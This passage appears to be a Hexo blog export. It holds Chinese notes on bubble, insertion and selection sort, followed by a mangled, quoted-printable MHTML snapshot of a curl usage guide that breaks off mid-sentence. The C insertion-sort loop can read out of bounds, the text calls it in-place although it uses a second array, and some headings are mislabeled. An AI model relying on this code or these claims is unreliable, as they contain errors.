<h3 id="冒泡排序算法的时间复杂度是多少？"><a href="#冒泡排序算法的时间复杂度是多少？" class="headerlink" title="冒泡排序算法的时间复杂度是多少？"></a>冒泡排序算法的时间复杂度是多少？</h3><h4 id="有序度和逆序度"><a href="#有序度和逆序度" class="headerlink" title="有序度和逆序度"></a>有序度和逆序度</h4><p>这里引进一个概念：有序度和逆序度。</p>
<blockquote>
<p>有序元素对：a[i]&lt;=a[j]，如果i&lt;j</p>
</blockquote>
<p>有序度即是此数组中有序元素对的个数。</p>
<p><img src="/2020/05/29/%E5%87%A0%E7%A7%8D%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/3.jpg" alt="3"></p>
<p>举个例子，对于需要从小到大排序的数组：</p>
<p>6，5，4，3，2，1的有序度是0；</p>
<p>1，2，3，4，5，6的有序度是15【n<em>(n-1)/2】;该种称为*</em>满有序度**。</p>
<p>我们可得：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">逆序度&#x3D;满有序度-有序度</span><br></pre></td></tr></table></figure>



<h4 id="分析时间复杂度"><a href="#分析时间复杂度" class="headerlink" title="分析时间复杂度"></a>分析时间复杂度</h4><p>最好情况：1，2，3，4，5，6。一次冒泡即可，时间复杂度为O(n)。</p>
<p>最坏情况：6，5，4，3，2，1。6次冒泡，时间复杂度为O(n^2)。</p>
<p>平均情况：</p>
<p>我们知道，冒泡算法包含两部分：<strong>比较</strong>和<strong>交换</strong>。每一次交换，有序度都加1。</p>
<p>当有序度为0时，需要n*(n-1)/2次交换。</p>
<p>当有序度为n*(n-1)/2时，需要0次交换。</p>
<p>此时我们取一个平均值，n*(n-1)/4，时间复杂度为O(n^2)。</p>
<p>这种方法不太严密，但大多数情况适用。</p>
<h2 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h2><p><img src="/2020/05/29/%E5%87%A0%E7%A7%8D%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/4.jpg" alt="4"></p>
<p>如图所示，橘色部分表示已经插入数组的数据，黄色部分表示未插入数组的数据。</p>
<p>插入算法实际上就是从数组中有0个数据开始，一个一个按大小顺序插入，插入完成时排序也完成。</p>
<blockquote>
<p>如上图所示，我们可以发现：元素的移动次数=数组的逆序度。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,j,value;</span><br><span class="line">	<span class="keyword">int</span> a[<span class="number">6</span>]=&#123;<span class="number">3</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">6</span>&#125;,b[<span class="number">6</span>];</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">6</span>;i++)&#123;</span><br><span class="line">		value = a[i];</span><br><span class="line">		<span class="keyword">if</span>(i==<span class="number">0</span>)b[i]=value;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			j=i;</span><br><span class="line">			<span class="keyword">while</span>(value&lt;b[j<span class="number">-1</span>] &amp;&amp; j&gt;=<span class="number">1</span>)&#123;</span><br><span class="line">				b[j]=b[j<span class="number">-1</span>];</span><br><span class="line">				j--;</span><br><span class="line">			&#125;</span><br><span class="line">			b[j]=value;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="插入排序是原地排序算法吗？"><a href="#插入排序是原地排序算法吗？" class="headerlink" title="插入排序是原地排序算法吗？"></a>插入排序是原地排序算法吗？</h3><p>是的。不涉及额外的存储空间。</p>
<h3 id="插入排序是稳定的排序算法吗？"><a href="#插入排序是稳定的排序算法吗？" class="headerlink" title="插入排序是稳定的排序算法吗？"></a>插入排序是稳定的排序算法吗？</h3><p>是的。</p>
<h3 id="插入排序算法的时间复杂度是多少？"><a href="#插入排序算法的时间复杂度是多少？" class="headerlink" title="插入排序算法的时间复杂度是多少？"></a>插入排序算法的时间复杂度是多少？</h3><p>最好情况：1，2，3，4，5，6。遍历比较即可，时间复杂度为O(n)。</p>
<p>最坏情况：6，5，4，3，2，1。每次都相当于在数组第一个位置增加一个数据，时间复杂度为O(n^2)。</p>
<p>平均情况：</p>
<p>我们知道<strong>在数组中插入一个数据时，平均时间复杂度为O(n)</strong>。而插入排序算法就相当于插入n次数据，所以平均时间复杂度是O(n^2)。</p>
<blockquote>
<p>注：虽然冒泡排序和插入排序的平均时间复杂度都是O(n^2)，但冒泡排序改变1的有序度要交换一次，就要三个赋值语句，而插入排序只要一个。</p>
</blockquote>
<h2 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h2><p><img src="/2020/05/29/%E5%87%A0%E7%A7%8D%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/5.jpg" alt="5"></p>
<p>选择排序是指在未排序的数据中选取最小的一个放置到最前以实现排序的效果。</p>
<h3 id="选择排序是原地排序算法吗？"><a href="#选择排序是原地排序算法吗？" class="headerlink" title="选择排序是原地排序算法吗？"></a>选择排序是原地排序算法吗？</h3><p>是的。不涉及额外的存储空间。</p>
<h3 id="插入排序是稳定的排序算法吗？-1"><a href="#插入排序是稳定的排序算法吗？-1" class="headerlink" title="插入排序是稳定的排序算法吗？"></a>插入排序是稳定的排序算法吗？</h3><p>不是。比如5，8，5，2，9 。第一次5和2交换时，位置就已改变。</p>
<h3 id="插入排序算法的时间复杂度是多少？-1"><a href="#插入排序算法的时间复杂度是多少？-1" class="headerlink" title="插入排序算法的时间复杂度是多少？"></a>插入排序算法的时间复杂度是多少？</h3><p>最好情况：1，2，3，4，5，6。每次寻找最小，寻找n次，时间复杂度为O(n^2)。</p>
<p>最坏情况：6，5，4，3，2，1。每次寻找最小且交换，寻找n次，时间复杂度为O(n^2)。</p>
<p>平均情况：自然也是O(n^2)。</p>
<h2 id="——————————————————————————————————"><a href="#——————————————————————————————————" class="headerlink" title="——————————————————————————————————-"></a>——————————————————————————————————-</h2><blockquote>
<p>以上三种算法适合小规模数据的排序，下面两种适合大规模排序</p>
</blockquote>
<h2 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h2><p><img src="/2020/05/29/%E5%87%A0%E7%A7%8D%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/6.jpg" alt="6"></p>
<h2 id="快排"><a href="#快排" class="headerlink" title="快排"></a>快排</h2><p><img src="/2020/05/29/%E5%87%A0%E7%A7%8D%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/7.jpg" alt="7"></p>
]]></content>
      <categories>
        <category>数据结构与算法之美</category>
      </categories>
  </entry>
  <entry>
    <title>Http协议真题/curl 的用法指南 - 阮一峰的网络日志</title>
    <url>/2020/05/26/Http%E5%8D%8F%E8%AE%AE%E7%9C%9F%E9%A2%98/curl%20%E7%9A%84%E7%94%A8%E6%B3%95%E6%8C%87%E5%8D%97%20-%20%E9%98%AE%E4%B8%80%E5%B3%B0%E7%9A%84%E7%BD%91%E7%BB%9C%E6%97%A5%E5%BF%97/</url>
    <content><![CDATA[From: <Saved by blink>
Snapshot-Content-Location: http://www.ruanyifeng.com/blog/2019/09/curl-reference.html
Subject: =?utf-8?Q?curl=20=E7=9A=84=E7=94=A8=E6=B3=95=E6=8C=87=E5=8D=97=20-=20=E9?=
 =?utf-8?Q?=98=AE=E4=B8=80=E5=B3=B0=E7=9A=84=E7=BD=91=E7=BB=9C=E6=97=A5=E5?=
 =?utf-8?Q?=BF=97?=
Date: Tue, 26 May 2020 12:25:18 -0000
MIME-Version: 1.0
Content-Type: multipart/related;
	type="text/html";
	boundary="----MultipartBoundary--ozwB9gKsn1GQUq15ujUxqsg9oVNhZdY27cqRD7Sw1G----"


------MultipartBoundary--ozwB9gKsn1GQUq15ujUxqsg9oVNhZdY27cqRD7Sw1G----
Content-Type: text/html
Content-ID: <frame-331E4B087354A2842AEB181D070C71EC@mhtml.blink>
Content-Transfer-Encoding: quoted-printable
Content-Location: http://www.ruanyifeng.com/blog/2019/09/curl-reference.html

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.=
w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html 1999 xmlns="3D"http://www.w3.=" org xhtml" id="3D"sixapart-standard""><head><meta http-equiv="3D"Content-=" type" content="3D"text/html;" charset="3DUTF-8""><link rel="3D"stylesheet"" type="=3D"text/css"" href="3D"cid:css-4df07dd2-3ad8-4b41-b5e3-ab23fc2cff7e@mhtml.bl=" ink">
   =20
<meta name="3D"generator"" content="3D"Movable" type 5.2.2">
<meta name="3D"viewport"" content="3D"width=3Ddevice-width," initial-scale="3D1"=">
<!--link rel=3D"stylesheet" href=3D"http://www.ruanyifeng.com/blog/styles.c=
ss" type=3D"text/css" /-->
<link rel="3D"start"" href="3D"http://www.ruanyifeng.com/blog/"" title="3D"Home"=">
<link rel="3D"alternate"" type="3D"application/atom+xml"" title="3D"Recent" entri="es"" href="3D"http://feeds.feedburner.com/ruanyifeng"">

<!--
<rdf:RDF xmlns=3D"http://web.resource.org/cc/"
         xmlns:dc=3D"http://purl.org/dc/elements/1.1/"
         xmlns:rdf=3D"http://www.w3.org/1999/02/22-rdf-syntax-ns#">
<Work rdf:about=3D"http://www.ruanyifeng.com/blog/2014/10/real-leadership-l=
essons-of-steve-jobs.html">
<dc:title>=E4=B9=94=E5=B8=83=E6=96=AF=E7=9A=84=E7=AE=A1=E7=90=86=E8=AF=BE</=
dc:title>
<dc:description>2011=E5=B9=B411=E6=9C=88=E5=87=BA=E7=89=88=E7=9A=84=E3=80=
=8A=E4=B9=94=E5=B8=83=E6=96=AF=E4=BC=A0=E3=80=8B=E5=BE=88=E7=95=85=E9=94=80=
=EF=BC=8C=E4=B9=9F=E5=86=99=E5=BE=97=E5=BE=88=E5=A5=BD=EF=BC=8C=E6=88=91=E8=
=BF=98=E5=86=99=E8=BF=87=E4=B8=80=E7=AF=87=E8=AF=BB=E5=90=8E=E6=84=9F=E3=80=
=82...</dc:description>
<dc:creator>=E9=98=AE=E4=B8=80=E5=B3=B0</dc:creator>
<dc:date>2014-10-02T12:13:53+08:00</dc:date>
<license rdf:resource=3D"http://creativecommons.org/licenses/by-nc-nd/3.0/"=
 />
</Work>
<License rdf:about=3D"http://creativecommons.org/licenses/by-nc-nd/3.0/">
</License>
</rdf:RDF>
-->


<link rel="3D"stylesheet"" type="3D"text/css"" href="3D"http://www.ruanyifeng.co=" m static themes theme_scrapbook theme_scrapbook.min.css">

   =20
    <link rel="3D"prev"" href="3D"http://www.ruanyifeng.com/blog/2019/09/react=" -hooks.html" title="3D"React" hooks="E5=85=A5=E9=97=A8=E6=95=99=E7=A8=8B"">
    <link 72="E6=9C=9F"" rel="3D"next"" href="3D"http://www.ruanyifeng.com/blog/2019/09/weekl=" y-issue-72.html" title="3D"=E7=A7=91=E6=8A=80=E7=88=B1=E5=A5=BD=E8=80=85=E5=" =91="A8=E5=88=8A=EF=BC=9A=E7=AC=AC">
   =20
    <title>curl =E7=9A=84=E7=94=A8=E6=B3=95=E6=8C=87=E5=8D=97 - =E9=98=AE=
=E4=B8=80=E5=B3=B0=E7=9A=84=E7=BD=91=E7=BB=9C=E6=97=A5=E5=BF=97</title>
<meta name="generator" content="Hexo 4.2.0"></head>
<body id="3D"scrapbook"" class="3D"mt-entry-archive" one-column">

    <div id="3D"container"">
        <div id="3D"container-inner"">

            <div id="3D"header"">
    <div id="3D"header-inner"">
        <div id="3D"header-content"">


            <div id="3D"header-name"">=E9=98=AE=E4=B8=80=E5=B3=B0=E7=9A=84=E7=
=BD=91=E7=BB=9C=E6=97=A5=E5=BF=97 <span id="3D"site_location""> =C2=BB <a hre="f=3D"http://www.ruanyifeng.com/blog/"" accesskey="3D"1"">=E9=A6=96=E9=A1=B5</a></span><span id="3D"site_archive""> =C2=BB <a href="3D"http://www.ruanyifeng.=" com blog archives.html">=E6=A1=A3=E6=A1=88</a></span>
</div>

<div id="3D"google_search"">
<!-- SiteSearch Google -->
<form action="3D"https://www.baidu.com/s"" target="3D"_blank"" method="3D"get"" i="d=3D"cse-search-box"">
  <div>
  <input type="3D"text"" size="3D"20"" name="3D"origin"" class="3D"searchbox"" id="=3D"sbi"" value="3D""">
 =20
  <!--input type=3D"image" src=3D"/static/themes/theme_scrapbook/images/top=
_search_submit.gif" class=3D"searchbox_submit" value=3D"" alt=3D"=E6=90=9C=
=E7=B4=A2" name=3D"sa" onclick=3D"this.form.wd.value =3D this.form.origin.v=
alue + ' inurl:www.ruanyifeng.com/blog'" /-->
  <input type="3D"image"" src="3D"http://www.ruanyifeng.com/static/themes/them=" e_scrapbook images top_search_submit.gif" class="3D"searchbox_submit"" value="=3D""" alt="3D"=E6=90=9C=E7=B4=A2"" name="3D"sa"">
</div>
</form>

<!-- SiteSearch Google -->
</div>
<div id="3D"feed_icon"">
<a href="3D"http://www.ruanyifeng.com/feed.html"" title="3D"=E8=AE=A2=E9=98=85=" feed">
<img src="/2020/05/26/Http%E5%8D%8F%E8%AE%AE%E7%9C%9F%E9%A2%98/curl%20%E7%9A%84%E7%94%A8%E6%B3%95%E6%8C%87%E5%8D%97%20-%20%E9%98%AE%E4%B8%80%E5%B3%B0%E7%9A%84%E7%BD%91%E7%BB%9C%E6%97%A5%E5%BF%97/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABze=" nr0aaaabgdbtueaak inwwk6qaaabl0rvh0u29mdhdhcmuaqwrvymugsw1hz2vszwfkexhjztwa="AAUzSURBVHjavFdbbFRVFF3nPjoz7dTWTittaW0jUDRAUqaNojyqREnEQKgfUj9MqqAmhqRt/OC=" d4cuy+kckoh+aigkc+gmjbdhorysj8dkhhmjlnddktju+6gmk87j3hs85d2z6hzntmywb3dn3nw="ftvfba+5xNYDl+e6Fkj6yqb/oDRbWq14vlPBLRKCITkxf0ROLt+hNjp1PPSRK4kA3vF1dXNRcWl=" ya2oqu9eos9opakaikxd+xkko6t15arwo7j mgmazu8megexgzhmx518dh72symmvkshnxwuwhd="HtxKIDIYTgMuDzgfmSOIQkYMpdUF8OY92Hytt4/jvkg47czzU16iQovM3QFwmNck+Yyduu7D6NA=" 0z6jr4thntfs9v4twqg6ui3s6mwkdncsftnxkljhdseuk3agptyhccdzmvs999burt 1vm4i0od="+hX7+MRG87jPGB/w1u8FPj9xEw7McVrnYuOCvtpjTth3J/nTg99c8LRhKhr6D3dTB5R24bXFwbM=" xbsyzzeoxaycepj95tb09agx npqlvntw8urnvzlvhjfnxifqry2oohuquvnue+ackowzo4o6lg="zTmuHq6nPvY2m9rVqjrIK2rMEKxqyG5NPAKt+wjo0LklgfNxJkZMA3KJvqRUk3z5UFY3QH14P0h=" +wuy79hpvgv7vusg4zrgy1ygzgqxmorccf17sy2ehnf9aeo085k2hqfbtxbscj0lcpgf2cn+wv+="DZ/LJQu6gD4R7oV7pBJwbSgtMvfiPoVp56DySwxm7EtkMs1WdAB7qzggsDJKQYsHucSkOudrkiC=" pwr fa2nycn8snik4nptsmyau3saddrkisjdfth0lzsroduopnz4ki9sxji5uhk7d4gdqfz2us3="1c7CoHMjRkKuDPHseCMrONVhNcDJwMJpKFVvg9L4OaTiNWm1x789KCqkrXhVBiEz0WYCT2nAzQA=" d1 vaetv1grrfp4vx5cfmncdpwvp0h0dhanpym7oif +o67vcj1 pcj4kgdzaup6wz+du+5yil6="fV+PsHGAOdwlPpvvUOyeeAVGyCdqkDNB6DPjsBSrnndfOGevOh3RhGItxvA+fX1CtbGFhgYUFkF=" mzpr6f1hnclhq8hyubwtjexx06crmdt33hrd7na7sfy4qogpnyuokcrykppgdcbcshx9iv+fnl2="PueBehCWUfYQIIMGLOCcOmXDXsh1+yCt35tUPfvzGFuSvzvoinXOxqa02qOhM6733nVP2MAdaej=" 2xn11dpkjlzcd+ybvahgco7jftkan9ud7s8oe9zunihz8fwi8dg2k38wcfdxugancxrvtvd1ieb="uv3Jour7Hzn7jLMBNfKs7R3i67gRVrbeCOEDhinmWhAatsqdquM2XzHZINhK2cqTjHr/XZdVJUb=" gn3mwavxkbsyg9jesrw2xp9di+lwrl5ojm3m2h kg9hwcia37c71w6wjdw2j2s5nrjybq t1aha="hJsKQeyfPvf6IMJgghPJhFZ4x0KlfLFvt22du45Au/A1SOlGc0P672XXwhLtOcM0kTTEMMd0qkV=" mmnxxmd tsedujinr4sqdgofexmsin0fcl5whah4l1qqyxpjojlttd+a5m+ypcg5polykq5f+6j="J4r8bbJYP47hq4r7QAs9PjYNhHJd4o8l5taiwuOpa7AS4XKqI/5NjJbTnaWK92nLdLuhQAJayRN=" miygxpbeqn+qbvu0zdc3y+auzhbkgr73si7ljvunndx2q3t+x8cdad66ftril864aaaaabjru5e="rkJggg=3D=3D"" alt="3D""" style="3D"border:" 0pt none;">
</a></div>

        </div>
    </div>
</div>



            <div id="3D"content"">
                <div id="3D"content-inner"">


                    <div id="3D"alpha"">
                        <div id="3D"alpha-inner"">


                            <div id="3D"entry-2115"" class="3D"entry-asset" ass="et" hentry">
                                <div class="3D"asset-header"">
<div class="3D"asset-nav" entry-nav">

<div class="3D"entry-location"">
<ul>
<li>=E4=B8=8A=E4=B8=80=E7=AF=87=EF=BC=9A<a 2019 href="3D"http://www.ruanyifeng.co=" m blog 09 react-hooks.html" title="3D"React" hooks="E5=85=A5=E9=97=A8=E6=" =95="99=E7=A8=8B"">React&nbsp;Hooks</a></li>
<li>=E4=B8=8B=E4=B8=80=E7=AF=87=EF=BC=9A<a 72="E6=9C=9F"" 2019 href="3D"http://www.ruanyifeng.co=" m blog 09 weekly-issue-72.html" title="3D"=E7=A7=91=E6=8A=80=E7=88=B1=" =e5="A5=BD=E8=80=85=E5=91=A8=E5=88=8A=EF=BC=9A=E7=AC=AC">=E7=A7=
=91=E6=8A=80=E7=88=B1=E5=A5=BD=E8=80=85=E5=91=A8=E5=88=8A=EF=BC=9A=E7=AC=AC=
&nbsp;7</a></li>
</ul>
</div>


   =20
                                    <div class="3D"entry-categories"">
                                        <p>=E5=88=86=E7=B1=BB<span class="3D=" "delimiter">=EF=BC=9A</span></p>
                                        <ul>
                                            <li><a href="3D"http://www.ruany=" ifeng.com blog developer " rel="3D"tag"">=E5=BC=80=E5=8F=91=E8=80=85=E6=89=8B=
=E5=86=8C</a></li>
                                        </ul>
                                    </div>
   =20


                                           =20
<div class="3D"entry-location-mobile"" style="3D"float:" right;">
<ul>
<li><a href="3D"http://www.ruanyifeng.com/blog/2019/09/react-hooks.html"" tit="le=3D"React" hooks="E5=85=A5=E9=97=A8=E6=95=99=E7=A8=8B"">=E2=87=90&nbsp;</a>=
</li>
<li><a 72="E6=9C=9F"" href="3D"http://www.ruanyifeng.com/blog/2019/09/weekly-issue-72.html"=" title="3D"=E7=A7=91=E6=8A=80=E7=88=B1=E5=A5=BD=E8=80=85=E5=91=A8=E5=88=8A=" =ef="BC=9A=E7=AC=AC">&nbsp;=E2=87=92</a></li>
</ul>
</div>

</div>
</div>

                         =20
<article class="3D"hentry"">
                                    <h1 id="3D"page-title"" class="3D"asset-na=" me entry-title">curl =E7=9A=84=E7=94=A8=E6=B3=95=E6=8C=87=E5=8D=97</h1>
                                            <div id="3D"share_button"" class="=3D"social-share"" style="3D"float:right;padding-right:2em;padding-top:1em;"">
<a class="3D"bshareDiv"" href="3D"http://www.bshare.cn/share"">=E5=88=86=E4=BA=
=AB=E6=8C=89=E9=92=AE</a>





</div>

<div class="3D"asset-meta"">
                                       =20

                                            <p class="3D"vcard" author">=E4=
=BD=9C=E8=80=85=EF=BC=9A <a class="3D"fn" url" href="3D"http://www.ruanyifeng.=" com ">=E9=98=AE=E4=B8=80=E5=B3=B0</a></p>
                                    <p>=E6=97=A5=E6=9C=9F=EF=BC=9A <a href="=3D"http://www.ruanyifeng.com/blog/2019/09/""><abbr class="3D"published"" titl="e=3D"2019-09-05T10:45:21+08:00"">2019=E5=B9=B49=E6=9C=88 5=E6=97=A5</abbr></a></p>


</div>








                               =20
                                <div class="3D"asset-content" entry-content"="id=3D"main-content"">

                                    <!-- div class=3D"asset-body" -->
                                        <h2>=E7=AE=80=E4=BB=8B</h2>

<p>curl =E6=98=AF=E5=B8=B8=E7=94=A8=E7=9A=84=E5=91=BD=E4=BB=A4=E8=A1=8C=E5=
=B7=A5=E5=85=B7=EF=BC=8C=E7=94=A8=E6=9D=A5=E8=AF=B7=E6=B1=82 Web =E6=9C=8D=
=E5=8A=A1=E5=99=A8=E3=80=82=E5=AE=83=E7=9A=84=E5=90=8D=E5=AD=97=E5=B0=B1=E6=
=98=AF=E5=AE=A2=E6=88=B7=E7=AB=AF=EF=BC=88client=EF=BC=89=E7=9A=84 URL =E5=
=B7=A5=E5=85=B7=E7=9A=84=E6=84=8F=E6=80=9D=E3=80=82</p>

                                    <!-- /div -->


                                    <!-- div id=3D"more" class=3D"asset-mor=
e" -->
                                        <p>=E5=AE=83=E7=9A=84=E5=8A=9F=E8=
=83=BD=E9=9D=9E=E5=B8=B8=E5=BC=BA=E5=A4=A7=EF=BC=8C=E5=91=BD=E4=BB=A4=E8=A1=
=8C=E5=8F=82=E6=95=B0=E5=A4=9A=E8=BE=BE=E5=87=A0=E5=8D=81=E7=A7=8D=E3=80=82=
=E5=A6=82=E6=9E=9C=E7=86=9F=E7=BB=83=E7=9A=84=E8=AF=9D=EF=BC=8C=E5=AE=8C=E5=
=85=A8=E5=8F=AF=E4=BB=A5=E5=8F=96=E4=BB=A3 Postman =E8=BF=99=E4=B8=80=E7=B1=
=BB=E7=9A=84=E5=9B=BE=E5=BD=A2=E7=95=8C=E9=9D=A2=E5=B7=A5=E5=85=B7=E3=80=82=
</p>

<p><img src="3D"https://www.wangbase.com/blogimg/asset/201909/bg2019090501.j=" pg" alt="3D""" title="3D"""></p>

<p>=E6=9C=AC=E6=96=87=E4=BB=8B=E7=BB=8D=E5=AE=83=E7=9A=84=E4=B8=BB=E8=A6=81=
=E5=91=BD=E4=BB=A4=E8=A1=8C=E5=8F=82=E6=95=B0=EF=BC=8C=E4=BD=9C=E4=B8=BA=E6=
=97=A5=E5=B8=B8=E7=9A=84=E5=8F=82=E8=80=83=EF=BC=8C=E6=96=B9=E4=BE=BF=E6=9F=
=A5=E9=98=85=E3=80=82=E5=86=85=E5=AE=B9=E4=B8=BB=E8=A6=81=E7=BF=BB=E8=AF=91=
=E8=87=AA<a href="3D"https://catonmat.net/cookbooks/curl"" target="3D"_blank"">=
=E3=80=8Acurl cookbook=E3=80=8B</a>=E3=80=82=E4=B8=BA=E4=BA=86=E8=8A=82=E7=
=BA=A6=E7=AF=87=E5=B9=85=EF=BC=8C=E4=B8=8B=E9=9D=A2=E7=9A=84=E4=BE=8B=E5=AD=
=90=E4=B8=8D=E5=8C=85=E6=8B=AC=E8=BF=90=E8=A1=8C=E6=97=B6=E7=9A=84=E8=BE=93=
=E5=87=BA=EF=BC=8C=E5=88=9D=E5=AD=A6=E8=80=85=E5=8F=AF=E4=BB=A5=E5=85=88=E7=
=9C=8B=E6=88=91=E4=BB=A5=E5=89=8D=E5=86=99=E7=9A=84<a 2011 href="3D"http://www.ru=" anyifeng.com blog 09 curl.html" target="3D"_blank"">=E3=80=8Acurl =E5=88=
=9D=E5=AD=A6=E8=80=85=E6=95=99=E7=A8=8B=E3=80=8B</a>=E3=80=82</p>

<p>=E4=B8=8D=E5=B8=A6=E6=9C=89=E4=BB=BB=E4=BD=95=E5=8F=82=E6=95=B0=E6=97=B6=
=EF=BC=8Ccurl =E5=B0=B1=E6=98=AF=E5=8F=91=E5=87=BA GET =E8=AF=B7=E6=B1=82=
=E3=80=82</p>

<blockquote><pre class="3D"" language-bash"><code class="3D"" language-bash">
$ curl https<span class="3D"token" punctuation">:</span><span class="3D"token" = operator">/</span><span class="3D"token" operator">/</span>www<span class="3D"=" token punctuation">.</span>example<span class="3D"token" punctuation">.com
</span></code></pre></blockquote>

<p>=E4=B8=8A=E9=9D=A2=E5=91=BD=E4=BB=A4=E5=90=91<code>www.example.com=E5=8F=91=E5=87=BA GET =E8=AF=B7=E6=B1=82=EF=BC=8C=E6=9C=8D=E5=8A=A1=E5=99=
=A8=E8=BF=94=E5=9B=9E=E7=9A=84=E5=86=85=E5=AE=B9=E4=BC=9A=E5=9C=A8=E5=91=BD=
=E4=BB=A4=E8=A1=8C=E8=BE=93=E5=87=BA=E3=80=82</code></p>

<h2><strong>-A</strong></h2>

<p><code>-A</code>=E5=8F=82=E6=95=B0=E6=8C=87=E5=AE=9A=E5=AE=A2=E6=88=B7=E7=
=AB=AF=E7=9A=84=E7=94=A8=E6=88=B7=E4=BB=A3=E7=90=86=E6=A0=87=E5=A4=B4=EF=BC=
=8C=E5=8D=B3<code>User-Agent</code>=E3=80=82curl =E7=9A=84=E9=BB=98=E8=AE=
=A4=E7=94=A8=E6=88=B7=E4=BB=A3=E7=90=86=E5=AD=97=E7=AC=A6=E4=B8=B2=E6=98=AF=
<code>curl/[version]</code>=E3=80=82</p>

<blockquote><pre class="3D"" language-bash"><code class="3D"" language-bash">
$ curl <span class="3D"token" operator">-</span>A <span class="3D"token" string=">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, lik=
e Gecko) Chrome/76.0.3809.100 Safari/537.36'</span> https<span class=3D" tok="en" punctuation">:</span><span class="3D"token" operator">/</span><span class="=3D"token" operator">/</span>google<span class="3D"token" punctuation">.com
</span></code></pre></blockquote>

<p>=E4=B8=8A=E9=9D=A2=E5=91=BD=E4=BB=A4=E5=B0=86<code>User-Agent</code>=E6=
=94=B9=E6=88=90 Chrome =E6=B5=8F=E8=A7=88=E5=99=A8=E3=80=82</p>

<blockquote><pre class="3D"" language-bash"><code class="3D"" language-bash">
$ curl <span class="3D"token" operator">-</span>A <span class="3D"token" string=">''</span> https<span class=3D" token punctuation">:</span><span class="3D"t=" oken operator">/</span><span class="3D"token" operator">/</span>google<span c="lass=3D"token" punctuation">.</span>com
</code></pre></blockquote>

<p>=E4=B8=8A=E9=9D=A2=E5=91=BD=E4=BB=A4=E4=BC=9A=E7=A7=BB=E9=99=A4<code>Use=
r-Agent</code>=E6=A0=87=E5=A4=B4=E3=80=82</p>

<p>=E4=B9=9F=E5=8F=AF=E4=BB=A5=E9=80=9A=E8=BF=87<code>-H</code>=E5=8F=82=E6=
=95=B0=E7=9B=B4=E6=8E=A5=E6=8C=87=E5=AE=9A=E6=A0=87=E5=A4=B4=EF=BC=8C=E6=9B=
=B4=E6=94=B9<code>User-Agent</code>=E3=80=82</p>

<blockquote><pre class="3D"" language-bash"><code class="3D"" language-bash">
$ curl <span class="3D"token" operator">-</span>H <span class="3D"token" string=">'User-Agent: php/1.0'</span> https<span class=3D" token punctuation">:<span class="3D"token" operator">/</span><span class="3D"token" operator">/<= span>google<span class="3D"token" punctuation">.</span>com
</=></span></span></code></pre></blockquote>

<h2><strong>-b</strong></h2>

<p><code>-b</code>=E5=8F=82=E6=95=B0=E7=94=A8=E6=9D=A5=E5=90=91=E6=9C=8D=E5=
=8A=A1=E5=99=A8=E5=8F=91=E9=80=81 Cookie=E3=80=82</p>

<blockquote><pre class="3D"" language-bash"><code class="3D"" language-bash">
$ curl <span class="3D"token" operator">-</span>b <span class="3D"token" string=">'foo=3Dbar'</span> https<span class=3D" token punctuation">:</span><span c="lass=3D"token" operator">/</span><span class="3D"token" operator">/</span>goog=
le<span class="3D"token" punctuation">.</span>com
</code></pre></blockquote>

<p>=E4=B8=8A=E9=9D=A2=E5=91=BD=E4=BB=A4=E4=BC=9A=E7=94=9F=E6=88=90=E4=B8=80=
=E4=B8=AA=E6=A0=87=E5=A4=B4<code>Cookie: foo=3Dbar</code>=EF=BC=8C=E5=90=91=
=E6=9C=8D=E5=8A=A1=E5=99=A8=E5=8F=91=E9=80=81=E4=B8=80=E4=B8=AA=E5=90=8D=E4=
=B8=BA<code>foo</code>=E3=80=81=E5=80=BC=E4=B8=BA<code>bar</code>=E7=9A=84 =
Cookie=E3=80=82</p>

<blockquote><pre class="3D"" language-bash"><code class="3D"" language-bash">
$ curl <span class="3D"token" operator">-</span>b <span class="3D"token" string=">'foo1=3Dbar;foo2=3Dbar2'</span> https<span class=3D" token punctuation">:<= span><span class="3D"token" operator">/</span><span class="3D"token" operator">/</span>google<span class="3D"token" punctuation">.</span>com
</=></span></code></pre></blockquote>

<p>=E4=B8=8A=E9=9D=A2=E5=91=BD=E4=BB=A4=E5=8F=91=E9=80=81=E4=B8=A4=E4=B8=AA=
 Cookie=E3=80=82</p>

<blockquote><pre class="3D"" language-bash"><code class="3D"" language-bash">
$ curl <span class="3D"token" operator">-</span>b cookies<span class="3D"token=" punctuation">.</span>txt https<span class="3D"token" punctuation">:</span><s= pan class="3D"token" operator">/<span class="3D"token" operator">/www<span class="3D"token" punctuation">.</span>google<span class="3D"token" pu="nctuation"">.</span>com
</span></s=></code></pre></blockquote>

<p>=E4=B8=8A=E9=9D=A2=E5=91=BD=E4=BB=A4=E8=AF=BB=E5=8F=96=E6=9C=AC=E5=9C=B0=
=E6=96=87=E4=BB=B6<code>cookies.txt</code>=EF=BC=8C=E9=87=8C=E9=9D=A2=E6=98=
=AF=E6=9C=8D=E5=8A=A1=E5=99=A8=E8=AE=BE=E7=BD=AE=E7=9A=84 Cookie=EF=BC=88=
=E5=8F=82=E8=A7=81<code>-c</code>=E5=8F=82=E6=95=B0=EF=BC=89=EF=BC=8C=E5=B0=
